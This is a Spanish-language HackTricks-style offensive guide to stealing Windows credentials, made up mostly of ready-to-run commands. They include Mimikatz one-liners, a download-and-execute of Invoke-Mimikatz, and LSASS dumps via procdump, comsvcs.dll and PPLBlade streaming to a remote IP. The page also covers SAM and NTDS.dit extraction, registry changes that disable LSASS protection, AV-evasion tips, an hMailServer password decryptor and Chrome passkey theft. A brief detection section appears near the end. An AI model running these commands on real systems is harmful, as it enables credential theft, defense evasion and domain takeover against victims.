# Robando credenciales de Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciales de Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían impedir que Mimikatz extraiga algunas credenciales.**

## Credentials with Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro del equipo víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evadiendo AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, Defender no lo detecta.\
Puedes usar esta herramienta para **hacer dump del proceso lsass**, **descargar el dump** y **extraer** las **credenciales localmente** del dump.

También podrías usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para hacer dump de lsass.exe**, porque están **detectando** las cadenas **"procdump.exe" y "lsass.exe"**. Por lo tanto, es más **stealthier** pasar como **argumento** el **PID** de lsass.exe a procdump **en lugar de** el **nombre lsass.exe.**

### Dumping lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32`, es responsable de **hacer dump de la memoria de los procesos** cuando ocurre un crash. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para invocarse mediante `rundll32.exe`.\
Es irrelevante utilizar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso cuyo dump se realizará constituye el primer componente, la ubicación del archivo de dump representa el segundo y el tercer componente debe ser estrictamente la palabra **full**. No existen opciones alternativas.\
Después de analizar estos tres componentes, la DLL se encarga de crear el archivo de dump y transferir la memoria del proceso especificado a este archivo.\
Es posible utilizar **comsvcs.dll** para hacer dump del proceso lsass, eliminando así la necesidad de subir y ejecutar procdump. Este método se describe detalladamente en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

El siguiente comando se utiliza para la ejecución:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcado de lsass con el Administrador de tareas**

1. Haz clic derecho en la barra de tareas y haz clic en Administrador de tareas
2. Haz clic en Más detalles
3. Busca el proceso "Local Security Authority Process" en la pestaña Procesos
4. Haz clic derecho en el proceso "Local Security Authority Process" y haz clic en "Create dump file".

### Volcado de lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Volcado de lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que permite ofuscar el volcado de memoria y transferirlo a estaciones de trabajo remotas sin escribirlo en el disco.

**Funcionalidades principales**:

1. Elusión de la protección PPL
2. Ofuscación de archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Subida del volcado de memoria mediante métodos de subida RAW y SMB sin escribirlo en el disco (volcado fileless)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper: volcado de LSASS basado en SSP sin MiniDumpWriteDump

Ink Dragon incluye un dumper de tres etapas llamado **LalsDumper** que nunca llama a `MiniDumpWriteDump`, por lo que los hooks de EDR en esa API nunca se activan:<sup>[[3]](#references)</sup>

1. **Cargador de la etapa 1 (`lals.exe`)**: busca en `fdp.dll` un marcador de posición compuesto por 32 caracteres `d` en minúsculas, lo sobrescribe con la ruta absoluta a `rtu.txt`, guarda la DLL modificada como `nfdp.dll` y llama a `AddSecurityPackageA("nfdp","fdp")`. Esto obliga a **LSASS** a cargar la DLL maliciosa como un nuevo Security Support Provider (SSP).
2. **Etapa 2 dentro de LSASS**: cuando LSASS carga `nfdp.dll`, la DLL lee `rtu.txt`, aplica XOR a cada byte con `0x20` y asigna el blob decodificado en memoria antes de transferir la ejecución.
3. **Dumper de la etapa 3**: el payload asignado vuelve a implementar la lógica de MiniDump mediante **syscalls directas** resueltas a partir de nombres de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Una exportación dedicada llamada `Tom` abre `%TEMP%\<pid>.ddt`, transmite un volcado comprimido de LSASS al archivo y cierra el handle para que la exfiltración pueda realizarse más tarde.

Notas para el operador:

* Mantén `lals.exe`, `fdp.dll`, `nfdp.dll` y `rtu.txt` en el mismo directorio. La etapa 1 reemplaza el marcador de posición hard-coded con la ruta absoluta a `rtu.txt`, por lo que separarlos rompe la cadena.
* El registro se realiza añadiendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puedes establecer ese valor por tu cuenta para hacer que LSASS vuelva a cargar el SSP en cada arranque.
* Los archivos `%TEMP%\*.ddt` son dumps comprimidos. Descomprímelos localmente y pásalos después a Mimikatz/Volatility para extraer credenciales.
* Ejecutar `lals.exe` requiere privilegios de administrador/SeTcb para que `AddSecurityPackageA` tenga éxito; cuando la llamada devuelve el control, LSASS carga de forma transparente el SSP rogue y ejecuta la etapa 2.
* Eliminar la DLL del disco no la expulsa de LSASS. Elimina la entrada del registro y reinicia LSASS (reiniciando el equipo), o déjala para mantener persistencia a largo plazo.

## CrackMapExec

### Volcado de hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump del NTDS.dit del DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump del historial de contraseñas de NTDS.dit del DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet de cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Robar SAM y SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de forma normal** porque están protegidos.

### Desde el registro

La forma más sencilla de robar esos archivos es obtener una copia del registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puedes realizar copias de archivos protegidos mediante este servicio. Necesitas ser Administrador.

#### Using vssadmin

El binario vssadmin solo está disponible en versiones de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Finalmente, también podrías utilizar el [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo **NTDS.dit** se conoce como el núcleo de **Active Directory** y contiene datos cruciales sobre objetos de usuario, grupos y sus membresías. Aquí se almacenan los **password hashes** de los usuarios del dominio. Este archivo es una base de datos **Extensible Storage Engine (ESE)** y se encuentra en **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro de esta base de datos se mantienen tres tablas principales:

- **Data Table**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
- **Link Table**: Registra las relaciones, como las membresías de grupos.
- **SD Table**: Aquí se almacenan los **security descriptors** de cada objeto, garantizando la seguridad y el control de acceso de los objetos almacenados.

La investigación de Christoffer Andersson sobre la capa de base de datos documenta estas tablas y su comportamiento específico según la versión con más detalle.<sup>[[8]](#references)</sup>

Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y este es utilizado por _lsass.exe_. Por lo tanto, una **parte** del archivo **NTDS.dit** podría encontrarse **dentro de la memoria de `lsass`** (probablemente se puede encontrar la información a la que se accedió más recientemente debido a la mejora del rendimiento mediante el uso de una **cache**).

#### Descifrando los hashes dentro de NTDS.dit

El hash se cifra tres veces:

1. Descifrar la Password Encryption Key (**PEK**) usando **BOOTKEY** y **RC4**.
2. Descifrar el **hash** usando **PEK** y **RC4**.
3. Descifrar el **hash** usando **DES**.

La **PEK** tiene el **mismo valor en todos los domain controllers**, pero está **cifrada** dentro de **NTDS.dit** con la **BOOTKEY** específica del DC del hive **SYSTEM** de ese domain controller. Por lo tanto, extraer credenciales requiere tanto **NTDS.dit** como **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copiando NTDS.dit usando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes usar el truco de [**volume shadow copy**](#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (de nuevo, usa el truco de [**volcarlo desde el registro o usar volume shadow copy**](#stealing-sam-and-system)).

### **Extracción de hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlas automáticamente** usando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para archivos **NTDS.dit grandes**, se recomienda extraerlos utilizando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes utilizar el **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos de NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para obtener más información cuando ya se ha recuperado el archivo NTDS.dit sin procesar.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La colmena `SYSTEM` es opcional, pero permite el descifrado de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves de kerberos o trust, historiales de contraseñas NT y LM). Además de otra información, se extraen los siguientes datos: cuentas de usuario y de máquina con sus hashes, flags de UAC, timestamp del último inicio de sesión y cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol y membresía de las unidades organizativas, dominios de confianza con el tipo, la dirección y los atributos de las relaciones de confianza...

## Lazagne

Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios software.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecútalo** para extraer las contraseñas.

## Minería de sesiones RDP inactivas y debilitamiento de los controles de seguridad

El RAT FinalDraft de Ink Dragon incluye un tasker `DumpRDPHistory` cuyas técnicas son útiles para cualquier red teamer:<sup>[[3]](#references)</sup>

### Recopilación de telemetría al estilo DumpRDPHistory

* **Destinos RDP salientes** – analiza cada hive de usuario en `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subclave almacena el nombre del servidor, `UsernameHint` y la marca de tiempo de la última escritura. Puedes replicar la lógica de FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidencia de RDP entrante** – consulta el registro `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` en busca de los IDs de evento **21** (inicio de sesión exitoso) y **25** (desconexión) para identificar quién administró el equipo:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una vez que sepas qué Domain Admin se conecta habitualmente, vuelca LSASS (con LalsDumper/Mimikatz) mientras su sesión **desconectada** aún exista. CredSSP + la alternativa NTLM dejan su verifier y sus tokens en LSASS, que después pueden reproducirse mediante SMB/WinRM para obtener `NTDS.dit` o establecer persistencia en los controladores de dominio.

### Downgrades del registro dirigidos por FinalDraft

El mismo implant también altera varias claves del registro para facilitar el robo de credenciales:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Configurar `DisableRestrictedAdmin=1` fuerza la reutilización completa de credenciales/tickets durante RDP, lo que permite pivots al estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` deshabilita el filtrado de tokens de UAC para que los administradores locales obtengan tokens sin restricciones a través de la red.
* `DSRMAdminLogonBehavior=2` permite que el administrador de DSRM inicie sesión mientras el DC está en línea, proporcionando a los atacantes otra cuenta integrada con altos privilegios.
* `RunAsPPL=0` elimina las protecciones PPL de LSASS, haciendo trivial el acceso a la memoria para dumpers como LalsDumper.

## Credenciales de la base de datos de hMailServer (tras el compromiso)

hMailServer almacena la contraseña de su DB en `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, bajo `[Database] Password=`. El valor está cifrado con Blowfish usando la clave estática `THIS_KEY_IS_NOT_SECRET` y cambios de endianess de palabras de 4 bytes. Usa la cadena hexadecimal del INI con este snippet de Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la contraseña en texto claro, copia la base de datos de SQL CE para evitar bloqueos de archivo, carga el proveedor de 32 bits y actualízalo si es necesario antes de consultar los hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La columna `accountpassword` usa el formato de hash de hMailServer (modo `1421` de hashcat). Crackear estos valores puede proporcionar credenciales reutilizables para pivots de WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Algunas herramientas capturan **contraseñas de inicio de sesión en texto plano** interceptando el callback de inicio de sesión de LSA `LsaApLogonUserEx2`. La idea es hookear o envolver el callback del paquete de autenticación para capturar las credenciales **durante el inicio de sesión** (antes del hashing) y, posteriormente, escribirlas en disco o devolverlas al operador. Esto suele implementarse como un componente auxiliar que se inyecta en LSA o se registra con este, y después registra cada evento exitoso de inicio de sesión interactivo o de red con el nombre de usuario, el dominio y la contraseña.<sup>[[1]](#references)</sup>

Notas operativas:
- Requiere permisos de administrador local/SYSTEM para cargar el componente auxiliar en la ruta de autenticación.
- Las credenciales capturadas solo aparecen cuando ocurre un inicio de sesión (interactivo, RDP, de servicio o de red, según el hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) almacena la información de conexión guardada en un archivo `sqlstudio.bin` por usuario. Los dumpers especializados pueden analizar el archivo y recuperar las credenciales SQL guardadas. En shells que solo devuelven la salida de los comandos, el archivo suele exfiltrarse codificándolo como Base64 e imprimiéndolo en stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
En el lado del operador, reconstruye el archivo y ejecuta el dumper localmente para recuperar las credenciales:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Robo de credenciales de Passkeys / WebAuthn desde Chrome en Windows

Si se obtiene ejecución de código como el **usuario víctima** en un host Windows que utiliza **Chrome + passkeys sincronizadas de Google Password Manager**, las passkeys se convierten en un objetivo interesante de post-exploitation incluso **sin admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefactos locales interesantes
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** almacena registros **`WebauthnCredentialSpecifics`** codificados con protobuf. Un proceso del mismo usuario puede enumerar el **RP ID**, el **username**, el **credential ID** y el material de clave privada cifrado de los passkeys sincronizados.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** almacena el estado de inscripción del dispositivo local, como **`wrapped_identity_private_key`** y el secreto envuelto utilizado para recuperar las credenciales sincronizadas.<sup>[[4]](#references)</sup>

Triaje rápido:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Los blobs de claves vinculados al TPM aún pueden abusarse como un oráculo de firma local

Si el navegador exporta una clave de identidad respaldada por TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** y almacena ese blob en un estado accesible para el usuario, el malware **no** necesita extraer la clave privada sin procesar. Simplemente puede volver a importar el blob en la **misma máquina** y pedir al TPM local que firme datos controlados por el atacante:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Esto significa que el **hardware binding evita la exportación fuera del dispositivo, pero no el uso por parte del mismo usuario en el endpoint comprometido**.

### Vías prácticas de abuso

1. **Relay de pass-ta-key / device-identity**<sup>[[4]](#references)</sup>
- Enumerar `WebauthnCredentialSpecifics` desde el LevelDB de Chrome.
- Iniciar un login con passkey y obtener un desafío WebAuthn nuevo.
- Usar el blob `wrapped_identity_private_key` robado en el TPM de la víctima para firmar el binding de la solicitud del cloud-authenticator.
- Hacer relay de la assertion devuelta al relying party.
- Esto es especialmente valioso cuando el RP acepta `userVerification=preferred` o no rechaza assertions con **`UV=0`**.
2. **Hijacking de pending UV-key**<sup>[[4]](#references)</sup>
- Forzar el re-onboarding eliminando `passkey_enclave_state` o enviando una operación `device/forget` válida y firmada.
- Si el onboarding deja el dispositivo en **`uv_key_pending`**, registrar una UV public key controlada por el atacante.
- Si el provider no verifica la attestation / el origen de secure-hardware de la nueva UV key, las firmas posteriores de la key del atacante se tratan como **`UV=1`**.
3. **Robo de master-secret / recuperación SDS**<sup>[[4]](#references)</sup>
- Forzar la recuperación o el rejoin para que Chrome descargue el master secret de las synced-passkeys.
- Observar la recreación/modificación de `passkey_enclave_state` y, después, volcar la memoria de Chrome mientras el **security domain secret (SDS)** en plaintext esté residente.
- Usar el SDS recuperado para descifrar los campos cifrados de cada registro `WebauthnCredentialSpecifics` y recuperar private keys WebAuthn portables.

### Ideas para DFIR / detección

- Monitorizar la **eliminación/recreación** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generar una alerta ante accesos anómalos a **`Sync Data\LevelDB`** de Chrome por parte de procesos que no sean browsers.
- Generar una alerta ante **volcados de memoria de Chrome** o accesos sospechosos a memoria entre procesos.
- Investigar solicitudes repetidas del **Google Password Manager recovery PIN** o re-onboarding inesperado.
- Recordar que **`signCount`** de WebAuthn a menudo no resulta útil para synced-passkeys porque puede permanecer constante, por lo que la detección clásica de clones es débil.

## References

- [1] [Unit 42 – Una investigación sobre años de operaciones no detectadas dirigidas contra sectores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing de macro VBA de Word mediante SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Dentro de Ink Dragon: revelando la red de relay y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: una nueva superficie de ataque en la autenticación sin contraseñas](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / almacenamiento de claves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Cómo funciona realmente el almacén de datos de Active Directory: dentro de NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Volcado remoto de contraseñas de LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
